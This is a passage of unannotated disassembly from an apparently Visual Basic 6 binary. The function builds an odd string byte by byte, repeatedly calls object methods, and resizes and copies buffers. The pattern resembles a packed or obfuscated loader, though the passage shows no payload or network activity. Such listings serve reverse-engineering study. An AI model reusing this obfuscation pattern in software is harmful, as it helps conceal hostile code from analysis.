.text:0040C4FA                 mov     ecx, [ebp+var_2C]
.text:0040C4FD                 push    0Ah
.text:0040C4FF                 pop     edx
.text:0040C500                 sub     edx, [ecx+14h]
.text:0040C503                 mov     ecx, [ebp+var_2C]
.text:0040C506                 mov     ecx, [ecx+0Ch]
.text:0040C509                 mov     [ecx+edx], al
.text:0040C50C                 mov     cx, 70h ; 'p'
.text:0040C510                 call    __vbaUI1I2
.text:0040C515                 mov     ecx, [ebp+var_2C]
.text:0040C518                 push    0Bh
.text:0040C51A                 pop     edx
.text:0040C51B                 sub     edx, [ecx+14h]
.text:0040C51E                 mov     ecx, [ebp+var_2C]
.text:0040C521                 mov     ecx, [ecx+0Ch]
.text:0040C524                 mov     [ecx+edx], al
.text:0040C527                 mov     cx, 65h ; 'e'
.text:0040C52B                 call    __vbaUI1I2
.text:0040C530                 mov     ecx, [ebp+var_2C]
.text:0040C533                 push    0Ch
.text:0040C535                 pop     edx
.text:0040C536                 sub     edx, [ecx+14h]
.text:0040C539                 mov     ecx, [ebp+var_2C]
.text:0040C53C                 mov     ecx, [ecx+0Ch]
.text:0040C53F                 mov     [ecx+edx], al
.text:0040C542                 mov     cx, 74h ; 't'
.text:0040C546                 call    __vbaUI1I2
.text:0040C54B                 mov     ecx, [ebp+var_2C]
.text:0040C54E                 push    0Dh
.text:0040C550                 pop     edx
.text:0040C551                 sub     edx, [ecx+14h]
.text:0040C554                 mov     ecx, [ebp+var_2C]
.text:0040C557                 mov     ecx, [ecx+0Ch]
.text:0040C55A                 mov     [ecx+edx], al
.text:0040C55D                 mov     cx, 69h ; 'i'
.text:0040C561                 call    __vbaUI1I2
.text:0040C566                 mov     ecx, [ebp+var_2C]
.text:0040C569                 push    0Eh
.text:0040C56B                 pop     edx
.text:0040C56C                 sub     edx, [ecx+14h]
.text:0040C56F                 mov     ecx, [ebp+var_2C]
.text:0040C572                 mov     ecx, [ecx+0Ch]
.text:0040C575                 mov     [ecx+edx], al
.text:0040C578                 mov     cx, 74h ; 't'
.text:0040C57C                 call    __vbaUI1I2
.text:0040C581                 mov     ecx, [ebp+var_2C]
.text:0040C584                 push    0Fh
.text:0040C586                 pop     edx
.text:0040C587                 sub     edx, [ecx+14h]
.text:0040C58A                 mov     ecx, [ebp+var_2C]
.text:0040C58D                 mov     ecx, [ecx+0Ch]
.text:0040C590                 mov     [ecx+edx], al
.text:0040C593                 mov     cx, 69h ; 'i'
.text:0040C597                 call    __vbaUI1I2
.text:0040C59C                 mov     ecx, [ebp+var_2C]
.text:0040C59F                 push    10h
.text:0040C5A1                 pop     edx
.text:0040C5A2                 sub     edx, [ecx+14h]
.text:0040C5A5                 mov     ecx, [ebp+var_2C]
.text:0040C5A8                 mov     ecx, [ecx+0Ch]
.text:0040C5AB                 mov     [ecx+edx], al
.text:0040C5AE                 mov     cx, 76h ; 'v'
.text:0040C5B2                 call    __vbaUI1I2
.text:0040C5B7                 mov     ecx, [ebp+var_2C]
.text:0040C5BA                 push    11h
.text:0040C5BC                 pop     edx
.text:0040C5BD                 sub     edx, [ecx+14h]
.text:0040C5C0                 mov     ecx, [ebp+var_2C]
.text:0040C5C3                 mov     ecx, [ecx+0Ch]
.text:0040C5C6                 mov     [ecx+edx], al
.text:0040C5C9                 mov     cx, 65h ; 'e'
.text:0040C5CD                 call    __vbaUI1I2
.text:0040C5D2                 mov     ecx, [ebp+var_2C]
.text:0040C5D5                 push    12h
.text:0040C5D7                 pop     edx
.text:0040C5D8                 sub     edx, [ecx+14h]
.text:0040C5DB                 mov     ecx, [ebp+var_2C]
.text:0040C5DE                 mov     ecx, [ecx+0Ch]
.text:0040C5E1                 mov     [ecx+edx], al
.text:0040C5E4                 mov     cx, 6Eh ; 'n'
.text:0040C5E8                 call    __vbaUI1I2
.text:0040C5ED                 mov     ecx, [ebp+var_2C]
.text:0040C5F0                 push    13h
.text:0040C5F2                 pop     edx
.text:0040C5F3                 sub     edx, [ecx+14h]
.text:0040C5F6                 mov     ecx, [ebp+var_2C]
.text:0040C5F9                 mov     ecx, [ecx+0Ch]
.text:0040C5FC                 mov     [ecx+edx], al
.text:0040C5FF                 mov     cx, 65h ; 'e'
.text:0040C603                 call    __vbaUI1I2
.text:0040C608                 mov     ecx, [ebp+var_2C]
.text:0040C60B                 push    14h
.text:0040C60D                 pop     edx
.text:0040C60E                 sub     edx, [ecx+14h]
.text:0040C611                 mov     ecx, [ebp+var_2C]
.text:0040C614                 mov     ecx, [ecx+0Ch]
.text:0040C617                 mov     [ecx+edx], al
.text:0040C61A                 mov     cx, 73h ; 's'
.text:0040C61E                 call    __vbaUI1I2
.text:0040C623                 mov     ecx, [ebp+var_2C]
.text:0040C626                 push    15h
.text:0040C628                 pop     edx
.text:0040C629                 sub     edx, [ecx+14h]
.text:0040C62C                 mov     ecx, [ebp+var_2C]
.text:0040C62F                 mov     ecx, [ecx+0Ch]
.text:0040C632                 mov     [ecx+edx], al
.text:0040C635                 mov     cx, 73h ; 's'
.text:0040C639                 call    __vbaUI1I2
.text:0040C63E                 mov     ecx, [ebp+var_2C]
.text:0040C641                 push    16h
.text:0040C643                 pop     edx
.text:0040C644                 sub     edx, [ecx+14h]
.text:0040C647                 mov     ecx, [ebp+var_2C]
.text:0040C64A                 mov     ecx, [ecx+0Ch]
.text:0040C64D                 mov     [ecx+edx], al
.text:0040C650                 mov     cx, 42h ; 'B'
.text:0040C654                 call    __vbaUI1I2
.text:0040C659                 mov     ecx, [ebp+var_2C]
.text:0040C65C                 push    17h
.text:0040C65E                 pop     edx
.text:0040C65F                 sub     edx, [ecx+14h]
.text:0040C662                 mov     ecx, [ebp+var_2C]
.text:0040C665                 mov     ecx, [ecx+0Ch]
.text:0040C668                 mov     [ecx+edx], al
.text:0040C66B                 mov     cx, 65h ; 'e'
.text:0040C66F                 call    __vbaUI1I2
.text:0040C674                 mov     ecx, [ebp+var_2C]
.text:0040C677                 push    18h
.text:0040C679                 pop     edx
.text:0040C67A                 sub     edx, [ecx+14h]
.text:0040C67D                 mov     ecx, [ebp+var_2C]
.text:0040C680                 mov     ecx, [ecx+0Ch]
.text:0040C683                 mov     [ecx+edx], al
.text:0040C686                 mov     cx, 6Dh ; 'm'
.text:0040C68A                 call    __vbaUI1I2
.text:0040C68F                 mov     ecx, [ebp+var_2C]
.text:0040C692                 push    19h
.text:0040C694                 pop     edx
.text:0040C695                 sub     edx, [ecx+14h]
.text:0040C698                 mov     ecx, [ebp+var_2C]
.text:0040C69B                 mov     ecx, [ecx+0Ch]
.text:0040C69E                 mov     [ecx+edx], al
.text:0040C6A1                 mov     cx, 6Fh ; 'o'
.text:0040C6A5                 call    __vbaUI1I2
.text:0040C6AA                 mov     ecx, [ebp+var_2C]
.text:0040C6AD                 push    1Ah
.text:0040C6AF                 pop     edx
.text:0040C6B0                 sub     edx, [ecx+14h]
.text:0040C6B3                 mov     ecx, [ebp+var_2C]
.text:0040C6B6                 mov     ecx, [ecx+0Ch]
.text:0040C6B9                 mov     [ecx+edx], al
.text:0040C6BC                 mov     cx, 61h ; 'a'
.text:0040C6C0                 call    __vbaUI1I2
.text:0040C6C5                 mov     ecx, [ebp+var_2C]
.text:0040C6C8                 push    1Bh
.text:0040C6CA                 pop     edx
.text:0040C6CB                 sub     edx, [ecx+14h]
.text:0040C6CE                 mov     ecx, [ebp+var_2C]
.text:0040C6D1                 mov     ecx, [ecx+0Ch]
.text:0040C6D4                 mov     [ecx+edx], al
.text:0040C6D7                 mov     cx, 6Eh ; 'n'
.text:0040C6DB                 call    __vbaUI1I2
.text:0040C6E0                 mov     ecx, [ebp+var_2C]
.text:0040C6E3                 push    1Ch
.text:0040C6E5                 pop     edx
.text:0040C6E6                 sub     edx, [ecx+14h]
.text:0040C6E9                 mov     ecx, [ebp+var_2C]
.text:0040C6EC                 mov     ecx, [ecx+0Ch]
.text:0040C6EF                 mov     [ecx+edx], al
.text:0040C6F2                 mov     cx, 38h ; '8'
.text:0040C6F6                 call    __vbaUI1I2
.text:0040C6FB                 mov     ecx, [ebp+var_2C]
.text:0040C6FE                 push    1Dh
.text:0040C700                 pop     edx
.text:0040C701                 sub     edx, [ecx+14h]
.text:0040C704                 mov     ecx, [ebp+var_2C]
.text:0040C707                 mov     ecx, [ecx+0Ch]
.text:0040C70A                 mov     [ecx+edx], al
.text:0040C70D                 mov     cx, 63h ; 'c'
.text:0040C711                 call    __vbaUI1I2
.text:0040C716                 mov     ecx, [ebp+var_2C]
.text:0040C719                 push    1Eh
.text:0040C71B                 pop     edx
.text:0040C71C                 sub     edx, [ecx+14h]
.text:0040C71F                 mov     ecx, [ebp+var_2C]
.text:0040C722                 mov     ecx, [ecx+0Ch]
.text:0040C725                 mov     [ecx+edx], al
.text:0040C728                 mov     cx, 61h ; 'a'
.text:0040C72C                 call    __vbaUI1I2
.text:0040C731                 mov     ecx, [ebp+var_2C]
.text:0040C734                 push    1Fh
.text:0040C736                 pop     edx
.text:0040C737                 sub     edx, [ecx+14h]
.text:0040C73A                 mov     ecx, [ebp+var_2C]
.text:0040C73D                 mov     ecx, [ecx+0Ch]
.text:0040C740                 mov     [ecx+edx], al
.text:0040C743                 mov     cx, 72h ; 'r'
.text:0040C747                 call    __vbaUI1I2
.text:0040C74C                 mov     ecx, [ebp+var_2C]
.text:0040C74F                 push    20h ; ' '
.text:0040C751                 pop     edx
.text:0040C752                 sub     edx, [ecx+14h]
.text:0040C755                 mov     ecx, [ebp+var_2C]
.text:0040C758                 mov     ecx, [ecx+0Ch]
.text:0040C75B                 mov     [ecx+edx], al
.text:0040C75E                 mov     cx, 76h ; 'v'
.text:0040C762                 call    __vbaUI1I2
.text:0040C767                 mov     ecx, [ebp+var_2C]
.text:0040C76A                 push    21h ; '!'
.text:0040C76C                 pop     edx
.text:0040C76D                 sub     edx, [ecx+14h]
.text:0040C770                 mov     ecx, [ebp+var_2C]
.text:0040C773                 mov     ecx, [ecx+0Ch]
.text:0040C776                 mov     [ecx+edx], al
.text:0040C779                 mov     cx, 65h ; 'e'
.text:0040C77D                 call    __vbaUI1I2
.text:0040C782                 mov     ecx, [ebp+var_2C]
.text:0040C785                 push    22h ; '"'
.text:0040C787                 pop     edx
.text:0040C788                 sub     edx, [ecx+14h]
.text:0040C78B                 mov     ecx, [ebp+var_2C]
.text:0040C78E                 mov     ecx, [ecx+0Ch]
.text:0040C791                 mov     [ecx+edx], al
.text:0040C794                 mov     cx, 6Eh ; 'n'
.text:0040C798                 call    __vbaUI1I2
.text:0040C79D                 mov     ecx, [ebp+var_2C]
.text:0040C7A0                 push    23h ; '#'
.text:0040C7A2                 pop     edx
.text:0040C7A3                 sub     edx, [ecx+14h]
.text:0040C7A6                 mov     ecx, [ebp+var_2C]
.text:0040C7A9                 mov     ecx, [ecx+0Ch]
.text:0040C7AC                 mov     [ecx+edx], al
.text:0040C7AF                 cmp     dword_40E0AC, 0
.text:0040C7B6                 jnz     short loc_40C7D3
.text:0040C7B8                 push    offset dword_40E0AC
.text:0040C7BD                 push    offset dword_401960
.text:0040C7C2                 call    __vbaNew2
.text:0040C7C7                 mov     [ebp+var_C4], offset dword_40E0AC
.text:0040C7D1                 jmp     short loc_40C7DD
.text:0040C7D3 ; ---------------------------------------------------------------------------
.text:0040C7D3
.text:0040C7D3 loc_40C7D3:                             ; CODE XREF: sub_40C38F+427↑j
.text:0040C7D3                 mov     [ebp+var_C4], offset dword_40E0AC
.text:0040C7DD
.text:0040C7DD loc_40C7DD:                             ; CODE XREF: sub_40C38F+442↑j
.text:0040C7DD                 mov     eax, [ebp+var_C4]
.text:0040C7E3                 mov     eax, [eax]
.text:0040C7E5                 mov     [ebp+var_A8], eax
.text:0040C7EB                 mov     eax, [ebp+arg_0]
.text:0040C7EE                 mov     eax, [eax]
.text:0040C7F0                 mov     [ebp+var_4C], eax
.text:0040C7F3                 mov     [ebp+var_54], 2011h
.text:0040C7FA                 lea     eax, [ebp+var_68]
.text:0040C7FD                 push    eax
.text:0040C7FE                 push    10h
.text:0040C800                 pop     eax
.text:0040C801                 call    __vbaChkstk
.text:0040C806                 lea     esi, [ebp+var_54]
.text:0040C809                 mov     edi, esp
.text:0040C80B                 movsd
.text:0040C80C                 movsd
.text:0040C80D                 movsd
.text:0040C80E                 movsd
.text:0040C80F                 mov     eax, [ebp+var_A8]
.text:0040C815                 mov     eax, [eax]
.text:0040C817                 push    [ebp+var_A8]
.text:0040C81D                 call    dword ptr [eax+38h]
.text:0040C820                 fnclex
.text:0040C822                 mov     [ebp+var_AC], eax
.text:0040C828                 cmp     [ebp+var_AC], 0
.text:0040C82F                 jge     short loc_40C851
.text:0040C831                 push    38h ; '8'
.text:0040C833                 push    offset dword_4027CC
.text:0040C838                 push    [ebp+var_A8]
.text:0040C83E                 push    [ebp+var_AC]
.text:0040C844                 call    __vbaHresultCheckObj
.text:0040C849                 mov     [ebp+var_C8], eax
.text:0040C84F                 jmp     short loc_40C858
.text:0040C851 ; ---------------------------------------------------------------------------
.text:0040C851
.text:0040C851 loc_40C851:                             ; CODE XREF: sub_40C38F+4A0↑j
.text:0040C851                 and     [ebp+var_C8], 0
.text:0040C858
.text:0040C858 loc_40C858:                             ; CODE XREF: sub_40C38F+4C0↑j
.text:0040C858                 mov     eax, [ebp+var_68]
.text:0040C85B                 add     eax, 1
.text:0040C85E                 jo      loc_40D0D8
.text:0040C864                 mov     [ebp+var_30], eax
.text:0040C867                 mov     eax, [ebp+arg_0]
.text:0040C86A                 push    dword ptr [eax]
.text:0040C86C                 lea     eax, [ebp+var_40]
.text:0040C86F                 push    eax
.text:0040C870                 call    __vbaAryLock
.text:0040C875                 push    1
.text:0040C877                 push    1
.text:0040C879                 mov     eax, [ebp+var_40]
.text:0040C87C                 xor     ecx, ecx
.text:0040C87E                 sub     ecx, [eax+14h]
.text:0040C881                 mov     eax, [ebp+var_40]
.text:0040C884                 mov     eax, [eax+0Ch]
.text:0040C887                 add     eax, ecx
.text:0040C889                 push    eax
.text:0040C88A                 call    sub_40A4A1
.text:0040C88F                 mov     [ebp+var_68], eax
.text:0040C892                 lea     eax, [ebp+var_40]
.text:0040C895                 push    eax
.text:0040C896                 call    __vbaAryUnlock
.text:0040C89B                 push    1
.text:0040C89D                 push    1
.text:0040C89F                 lea     eax, [ebp+var_24]
.text:0040C8A2                 push    eax
.text:0040C8A3                 call    sub_40D0DD
.text:0040C8A8                 mov     [ebp+var_90], eax
.text:0040C8AE                 cmp     dword_40E0AC, 0
.text:0040C8B5                 jnz     short loc_40C8D2
.text:0040C8B7                 push    offset dword_40E0AC
.text:0040C8BC                 push    offset dword_401960
.text:0040C8C1                 call    __vbaNew2
.text:0040C8C6                 mov     [ebp+var_CC], offset dword_40E0AC
.text:0040C8D0                 jmp     short loc_40C8DC
.text:0040C8D2 ; ---------------------------------------------------------------------------
.text:0040C8D2
.text:0040C8D2 loc_40C8D2:                             ; CODE XREF: sub_40C38F+526↑j
.text:0040C8D2                 mov     [ebp+var_CC], offset dword_40E0AC
.text:0040C8DC
.text:0040C8DC loc_40C8DC:                             ; CODE XREF: sub_40C38F+541↑j
.text:0040C8DC                 mov     eax, [ebp+var_CC]
.text:0040C8E2                 mov     eax, [eax]
.text:0040C8E4                 mov     [ebp+var_A8], eax
.text:0040C8EA                 and     [ebp+var_88], 0
.text:0040C8F1                 and     [ebp+var_84], 0
.text:0040C8F8                 and     [ebp+var_80], 0
.text:0040C8FC                 mov     eax, [ebp+var_90]
.text:0040C902                 mov     [ebp+var_7C], eax
.text:0040C905                 and     [ebp+var_78], 0
.text:0040C909                 mov     [ebp+var_74], 1
.text:0040C910                 mov     eax, [ebp+var_68]
.text:0040C913                 mov     [ebp+var_70], eax
.text:0040C916                 mov     [ebp+var_6C], 7
.text:0040C91D                 lea     eax, [ebp+var_8C]
.text:0040C923                 push    eax
.text:0040C924                 lea     eax, [ebp+var_88]
.text:0040C92A                 push    eax
.text:0040C92B                 lea     eax, [ebp+var_84]
.text:0040C931                 push    eax
.text:0040C932                 lea     eax, [ebp+var_1C]
.text:0040C935                 push    eax
.text:0040C936                 lea     eax, [ebp+var_80]
.text:0040C939                 push    eax
.text:0040C93A                 lea     eax, [ebp+var_7C]
.text:0040C93D                 push    eax
.text:0040C93E                 lea     eax, [ebp+var_78]
.text:0040C941                 push    eax
.text:0040C942                 lea     eax, [ebp+var_74]
.text:0040C945                 push    eax
.text:0040C946                 lea     eax, [ebp+var_30]
.text:0040C949                 push    eax
.text:0040C94A                 lea     eax, [ebp+var_70]
.text:0040C94D                 push    eax
.text:0040C94E                 lea     eax, [ebp+var_6C]
.text:0040C951                 push    eax
.text:0040C952                 push    dword_40E130
.text:0040C958                 push    dword_40E154
.text:0040C95E                 mov     eax, [ebp+var_A8]
.text:0040C964                 mov     eax, [eax]
.text:0040C966                 push    [ebp+var_A8]
.text:0040C96C                 call    dword ptr [eax+30h]
.text:0040C96F                 fnclex
.text:0040C971                 mov     [ebp+var_AC], eax
.text:0040C977                 cmp     [ebp+var_AC], 0
.text:0040C97E                 jge     short loc_40C9A0
.text:0040C980                 push    30h ; '0'
.text:0040C982                 push    offset dword_4027CC
.text:0040C987                 push    [ebp+var_A8]
.text:0040C98D                 push    [ebp+var_AC]
.text:0040C993                 call    __vbaHresultCheckObj
.text:0040C998                 mov     [ebp+var_D0], eax
.text:0040C99E                 jmp     short loc_40C9A7
.text:0040C9A0 ; ---------------------------------------------------------------------------
.text:0040C9A0
.text:0040C9A0 loc_40C9A0:                             ; CODE XREF: sub_40C38F+5EF↑j
.text:0040C9A0                 and     [ebp+var_D0], 0
.text:0040C9A7
.text:0040C9A7 loc_40C9A7:                             ; CODE XREF: sub_40C38F+60F↑j
.text:0040C9A7                 push    0
.text:0040C9A9                 mov     eax, [ebp+var_24]
.text:0040C9AC                 sub     eax, 1
.text:0040C9AF                 jo      loc_40D0D8
.text:0040C9B5                 push    eax
.text:0040C9B6                 push    1
.text:0040C9B8                 push    11h
.text:0040C9BA                 lea     eax, [ebp+var_3C]
.text:0040C9BD                 push    eax
.text:0040C9BE                 push    1
.text:0040C9C0                 push    80h
.text:0040C9C5                 call    __vbaRedim
.text:0040C9CA                 add     esp, 1Ch
.text:0040C9CD                 mov     eax, [ebp+arg_0]
.text:0040C9D0                 push    dword ptr [eax]
.text:0040C9D2                 lea     eax, [ebp+var_40]
.text:0040C9D5                 push    eax
.text:0040C9D6                 call    __vbaAryLock
.text:0040C9DB                 push    1
.text:0040C9DD                 push    1
.text:0040C9DF                 mov     eax, [ebp+var_40]
.text:0040C9E2                 xor     ecx, ecx
.text:0040C9E4                 sub     ecx, [eax+14h]
.text:0040C9E7                 mov     eax, [ebp+var_40]
.text:0040C9EA                 mov     eax, [eax+0Ch]
.text:0040C9ED                 add     eax, ecx
.text:0040C9EF                 push    eax
.text:0040C9F0                 call    sub_40A4A1
.text:0040C9F5                 mov     [ebp+var_68], eax
.text:0040C9F8                 lea     eax, [ebp+var_40]
.text:0040C9FB                 push    eax
.text:0040C9FC                 call    __vbaAryUnlock
.text:0040CA01                 push    [ebp+var_3C]
.text:0040CA04                 lea     eax, [ebp+var_44]
.text:0040CA07                 push    eax
.text:0040CA08                 call    __vbaAryLock
.text:0040CA0D                 push    1
.text:0040CA0F                 push    1
.text:0040CA11                 mov     eax, [ebp+var_44]
.text:0040CA14                 xor     ecx, ecx
.text:0040CA16                 sub     ecx, [eax+14h]
.text:0040CA19                 mov     eax, [ebp+var_44]
.text:0040CA1C                 mov     eax, [eax+0Ch]
.text:0040CA1F                 add     eax, ecx
.text:0040CA21                 push    eax
.text:0040CA22                 call    sub_40A4A1
.text:0040CA27                 mov     [ebp+var_6C], eax
.text:0040CA2A                 lea     eax, [ebp+var_44]
.text:0040CA2D                 push    eax
.text:0040CA2E                 call    __vbaAryUnlock
.text:0040CA33                 push    1
.text:0040CA35                 push    1
.text:0040CA37                 lea     eax, [ebp+var_24]
.text:0040CA3A                 push    eax
.text:0040CA3B                 call    sub_40D0DD
.text:0040CA40                 mov     [ebp+var_94], eax
.text:0040CA46                 cmp     dword_40E0AC, 0
.text:0040CA4D                 jnz     short loc_40CA6A
.text:0040CA4F                 push    offset dword_40E0AC
.text:0040CA54                 push    offset dword_401960
.text:0040CA59                 call    __vbaNew2
.text:0040CA5E                 mov     [ebp+var_D4], offset dword_40E0AC
.text:0040CA68                 jmp     short loc_40CA74
.text:0040CA6A ; ---------------------------------------------------------------------------
.text:0040CA6A
.text:0040CA6A loc_40CA6A:                             ; CODE XREF: sub_40C38F+6BE↑j
.text:0040CA6A                 mov     [ebp+var_D4], offset dword_40E0AC
.text:0040CA74
.text:0040CA74 loc_40CA74:                             ; CODE XREF: sub_40C38F+6D9↑j
.text:0040CA74                 mov     eax, [ebp+var_D4]
.text:0040CA7A                 mov     eax, [eax]
.text:0040CA7C                 mov     [ebp+var_A8], eax
.text:0040CA82                 and     [ebp+var_8C], 0
.text:0040CA89                 and     [ebp+var_88], 0
.text:0040CA90                 and     [ebp+var_84], 0
.text:0040CA97                 mov     eax, [ebp+var_94]
.text:0040CA9D                 mov     [ebp+var_80], eax
.text:0040CAA0                 mov     eax, [ebp+var_6C]
.text:0040CAA3                 mov     [ebp+var_7C], eax
.text:0040CAA6                 mov     [ebp+var_78], 1
.text:0040CAAD                 mov     eax, [ebp+var_68]
.text:0040CAB0                 mov     [ebp+var_74], eax
.text:0040CAB3                 mov     [ebp+var_70], 7
.text:0040CABA                 lea     eax, [ebp+var_90]
.text:0040CAC0                 push    eax
.text:0040CAC1                 lea     eax, [ebp+var_8C]
.text:0040CAC7                 push    eax
.text:0040CAC8                 lea     eax, [ebp+var_88]
.text:0040CACE                 push    eax
.text:0040CACF                 lea     eax, [ebp+var_1C]
.text:0040CAD2                 push    eax
.text:0040CAD3                 lea     eax, [ebp+var_84]
.text:0040CAD9                 push    eax
.text:0040CADA                 lea     eax, [ebp+var_80]
.text:0040CADD                 push    eax
.text:0040CADE                 lea     eax, [ebp+var_7C]
.text:0040CAE1                 push    eax
.text:0040CAE2                 lea     eax, [ebp+var_78]
.text:0040CAE5                 push    eax
.text:0040CAE6                 lea     eax, [ebp+var_30]
.text:0040CAE9                 push    eax
.text:0040CAEA                 lea     eax, [ebp+var_74]
.text:0040CAED                 push    eax
.text:0040CAEE                 lea     eax, [ebp+var_70]
.text:0040CAF1                 push    eax
.text:0040CAF2                 push    dword_40E130
.text:0040CAF8                 push    dword_40E154
.text:0040CAFE                 mov     eax, [ebp+var_A8]
.text:0040CB04                 mov     eax, [eax]
.text:0040CB06                 push    [ebp+var_A8]
.text:0040CB0C                 call    dword ptr [eax+30h]
.text:0040CB0F                 fnclex
.text:0040CB11                 mov     [ebp+var_AC], eax
.text:0040CB17                 cmp     [ebp+var_AC], 0
.text:0040CB1E                 jge     short loc_40CB40
.text:0040CB20                 push    30h ; '0'
.text:0040CB22                 push    offset dword_4027CC
.text:0040CB27                 push    [ebp+var_A8]
.text:0040CB2D                 push    [ebp+var_AC]
.text:0040CB33                 call    __vbaHresultCheckObj
.text:0040CB38                 mov     [ebp+var_D8], eax
.text:0040CB3E                 jmp     short loc_40CB47
.text:0040CB40 ; ---------------------------------------------------------------------------
.text:0040CB40
.text:0040CB40 loc_40CB40:                             ; CODE XREF: sub_40C38F+78F↑j
.text:0040CB40                 and     [ebp+var_D8], 0
.text:0040CB47
.text:0040CB47 loc_40CB47:                             ; CODE XREF: sub_40C38F+7AF↑j
.text:0040CB47                 cmp     dword_40E0AC, 0
.text:0040CB4E                 jnz     short loc_40CB6B
.text:0040CB50                 push    offset dword_40E0AC
.text:0040CB55                 push    offset dword_401960
.text:0040CB5A                 call    __vbaNew2
.text:0040CB5F                 mov     [ebp+var_DC], offset dword_40E0AC
.text:0040CB69                 jmp     short loc_40CB75
.text:0040CB6B ; ---------------------------------------------------------------------------
.text:0040CB6B
.text:0040CB6B loc_40CB6B:                             ; CODE XREF: sub_40C38F+7BF↑j
.text:0040CB6B                 mov     [ebp+var_DC], offset dword_40E0AC
.text:0040CB75
.text:0040CB75 loc_40CB75:                             ; CODE XREF: sub_40C38F+7DA↑j
.text:0040CB75                 mov     eax, [ebp+var_DC]
.text:0040CB7B                 mov     eax, [eax]
.text:0040CB7D                 mov     [ebp+var_A8], eax
.text:0040CB83                 mov     eax, [ebp+var_3C]
.text:0040CB86                 mov     [ebp+var_4C], eax
.text:0040CB89                 mov     [ebp+var_54], 2011h
.text:0040CB90                 lea     eax, [ebp+var_68]
.text:0040CB93                 push    eax
.text:0040CB94                 push    10h
.text:0040CB96                 pop     eax
.text:0040CB97                 call    __vbaChkstk
.text:0040CB9C                 lea     esi, [ebp+var_54]
.text:0040CB9F                 mov     edi, esp
.text:0040CBA1                 movsd
.text:0040CBA2                 movsd
.text:0040CBA3                 movsd
.text:0040CBA4                 movsd
.text:0040CBA5                 mov     eax, [ebp+var_A8]
.text:0040CBAB                 mov     eax, [eax]
.text:0040CBAD                 push    [ebp+var_A8]
.text:0040CBB3                 call    dword ptr [eax+38h]
.text:0040CBB6                 fnclex
.text:0040CBB8                 mov     [ebp+var_AC], eax
.text:0040CBBE                 cmp     [ebp+var_AC], 0
.text:0040CBC5                 jge     short loc_40CBE7
.text:0040CBC7                 push    38h ; '8'
.text:0040CBC9                 push    offset dword_4027CC
.text:0040CBCE                 push    [ebp+var_A8]
.text:0040CBD4                 push    [ebp+var_AC]
.text:0040CBDA                 call    __vbaHresultCheckObj
.text:0040CBDF                 mov     [ebp+var_E0], eax
.text:0040CBE5                 jmp     short loc_40CBEE
.text:0040CBE7 ; ---------------------------------------------------------------------------
.text:0040CBE7
.text:0040CBE7 loc_40CBE7:                             ; CODE XREF: sub_40C38F+836↑j
.text:0040CBE7                 and     [ebp+var_E0], 0
.text:0040CBEE
.text:0040CBEE loc_40CBEE:                             ; CODE XREF: sub_40C38F+856↑j
.text:0040CBEE                 fild    [ebp+var_68]
.text:0040CBF1                 fstp    [ebp+var_E8]
.text:0040CBF7                 fld     [ebp+var_E8]
.text:0040CBFD                 fmul    ds:dbl_401328
.text:0040CC03                 call    __vbaFpI4
.text:0040CC08                 mov     [ebp+var_18], eax
.text:0040CC0B                 push    0
.text:0040CC0D                 push    [ebp+var_18]
.text:0040CC10                 push    1
.text:0040CC12                 push    11h
.text:0040CC14                 push    [ebp+arg_0]
.text:0040CC17                 push    1
.text:0040CC19                 push    80h
.text:0040CC1E                 call    __vbaRedim
.text:0040CC23                 add     esp, 1Ch
.text:0040CC26                 mov     eax, [ebp+arg_0]
.text:0040CC29                 push    dword ptr [eax]
.text:0040CC2B                 lea     eax, [ebp+var_40]
.text:0040CC2E                 push    eax
.text:0040CC2F                 call    __vbaAryLock
.text:0040CC34                 push    1
.text:0040CC36                 push    1
.text:0040CC38                 mov     eax, [ebp+var_40]
.text:0040CC3B                 xor     ecx, ecx
.text:0040CC3D                 sub     ecx, [eax+14h]
.text:0040CC40                 mov     eax, [ebp+var_40]
.text:0040CC43                 mov     eax, [eax+0Ch]
.text:0040CC46                 add     eax, ecx
.text:0040CC48                 push    eax
.text:0040CC49                 call    sub_40A4A1
.text:0040CC4E                 mov     [ebp+var_68], eax
.text:0040CC51                 lea     eax, [ebp+var_40]
.text:0040CC54                 push    eax
.text:0040CC55                 call    __vbaAryUnlock
.text:0040CC5A                 cmp     dword_40E0AC, 0
.text:0040CC61                 jnz     short loc_40CC7E
.text:0040CC63                 push    offset dword_40E0AC
.text:0040CC68                 push    offset dword_401960
.text:0040CC6D                 call    __vbaNew2
.text:0040CC72                 mov     [ebp+var_EC], offset dword_40E0AC
.text:0040CC7C                 jmp     short loc_40CC88
.text:0040CC7E ; ---------------------------------------------------------------------------
.text:0040CC7E
.text:0040CC7E loc_40CC7E:                             ; CODE XREF: sub_40C38F+8D2↑j
.text:0040CC7E                 mov     [ebp+var_EC], offset dword_40E0AC
.text:0040CC88
.text:0040CC88 loc_40CC88:                             ; CODE XREF: sub_40C38F+8ED↑j
.text:0040CC88                 mov     eax, [ebp+var_EC]
.text:0040CC8E                 mov     eax, [eax]
.text:0040CC90                 mov     [ebp+var_A8], eax
.text:0040CC96                 mov     eax, [ebp+var_3C]
.text:0040CC99                 mov     [ebp+var_4C], eax
.text:0040CC9C                 mov     [ebp+var_54], 2011h
.text:0040CCA3                 lea     eax, [ebp+var_6C]
.text:0040CCA6                 push    eax
.text:0040CCA7                 push    10h
.text:0040CCA9                 pop     eax
.text:0040CCAA                 call    __vbaChkstk
.text:0040CCAF                 lea     esi, [ebp+var_54]
.text:0040CCB2                 mov     edi, esp
.text:0040CCB4                 movsd
.text:0040CCB5                 movsd
.text:0040CCB6                 movsd
.text:0040CCB7                 movsd
.text:0040CCB8                 mov     eax, [ebp+var_A8]
.text:0040CCBE                 mov     eax, [eax]
.text:0040CCC0                 push    [ebp+var_A8]
.text:0040CCC6                 call    dword ptr [eax+38h]
.text:0040CCC9                 fnclex
.text:0040CCCB                 mov     [ebp+var_AC], eax
.text:0040CCD1                 cmp     [ebp+var_AC], 0
.text:0040CCD8                 jge     short loc_40CCFA
.text:0040CCDA                 push    38h ; '8'
.text:0040CCDC                 push    offset dword_4027CC
.text:0040CCE1                 push    [ebp+var_A8]
.text:0040CCE7                 push    [ebp+var_AC]
.text:0040CCED                 call    __vbaHresultCheckObj
.text:0040CCF2                 mov     [ebp+var_F0], eax
.text:0040CCF8                 jmp     short loc_40CD01
.text:0040CCFA ; ---------------------------------------------------------------------------
.text:0040CCFA
.text:0040CCFA loc_40CCFA:                             ; CODE XREF: sub_40C38F+949↑j
.text:0040CCFA                 and     [ebp+var_F0], 0
.text:0040CD01
.text:0040CD01 loc_40CD01:                             ; CODE XREF: sub_40C38F+969↑j
.text:0040CD01                 push    [ebp+var_3C]
